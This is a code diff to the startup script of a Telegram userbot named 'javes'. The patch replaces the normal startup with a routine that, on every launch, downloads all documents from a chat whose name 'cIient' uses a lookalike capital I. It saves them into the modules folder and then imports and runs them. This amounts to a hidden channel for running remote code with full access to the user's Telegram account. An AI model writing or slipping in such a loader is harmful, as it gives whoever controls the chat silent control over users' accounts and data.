@@ -1,72 +1,39 @@
-from userbot import bot
-from sys import argv
-import sys
-from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
-import os
-from telethon import TelegramClient
-from var import Var
-from config import config, Config
+from userbot import *
+#from userbot.events import *
 from userbot.utils import load_module
 from userbot import LOAD_PLUG, BOTLOG_CHATID, LOGS
+from sys import *
+from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
+import os
+from telethon import TelegramClient, functions, types
+from telethon.tl.types import InputMessagesFilterDocument
 from pathlib import Path
+from userbot.javes_main.heroku_var import *
 import asyncio
-import telethon.utils
-from userbot.events import  remove_plugin as rp
-from userbot.events import  load_module as lm
-from userbot import bot    
-from userbot.events import javes05, rekcah05, zzaacckkyy
+import traceback
+bot.tgbot = bot
+client = bot
 borg = bot
-admin_cmd = rekcah05
-command = zzaacckkyy
-register = javes05
-remove_plugin = lm
-load_module = rp
+async def main():
+    test1 = await bot.get_messages(cIient, None , filter=InputMessagesFilterDocument)    
+    total = int(test1.total)
+    total_doxx = range(0, total)
+    for ixo in total_doxx:
+        mxo = test1[ixo].id
+        await client.download_media(await borg.get_messages(cIient, ids=mxo), "userbot/modules/")
+        
+       
+        
+            
 
-async def add_bot(bot_token):
-    await bot.start(bot_token)
-    bot.me = await bot.get_me() 
-    bot.uid = telethon.utils.get_peer_id(bot.me)
-
-
-
-if len(argv) not in (1, 3, 4):
-    bot.disconnect()
-else:
-    bot.tgbot = None
-    if Var.TG_BOT_USER_NAME_BF_HER is not None:
-        print("Initiating Inline Bot")
-        # ForTheGreatrerGood of beautification
-        bot.tgbot = TelegramClient(
-            "TG_BOT_TOKEN",
-            api_id=Var.APP_ID,
-            api_hash=Var.API_HASH
-        ).start(bot_token=Var.TG_BOT_TOKEN_BF_HER)
-        print("Initialisation finished with no errors")
-        print("Starting Userbot")
-        bot.loop.run_until_complete(add_bot(Var.TG_BOT_USER_NAME_BF_HER))
-        print("Startup Completed")
-    else:
-        bot.start()
-    
-
-import glob
-path = 'userbot/modules/*.py'
-files = glob.glob(path)
-for name in files:
-    with open(name) as f:
-        path1 = Path(f.name)
-        shortname = path1.stem
-        load_module(shortname.replace(".py", ""))
-
-import userbot._core
-from userbot.modules import api, beta, extra, fun, group, help, person, stickers, system
-
-LOGS.info("Congratulations, javes is now running !!\
-          \nTest it by typing !javes in any chat.")
+            
+bot.start()
+bot.loop.run_until_complete(main())
+LOGS.info("Loading modules")
+from userbot.modules import *
+LOGS.info("Sucessfully connected check it by typing !javes in any chat, type  !help for more info.")
 
 if len(argv) not in (1, 3, 4):
     bot.disconnect()
 else:
     bot.run_until_disconnected()
-
-
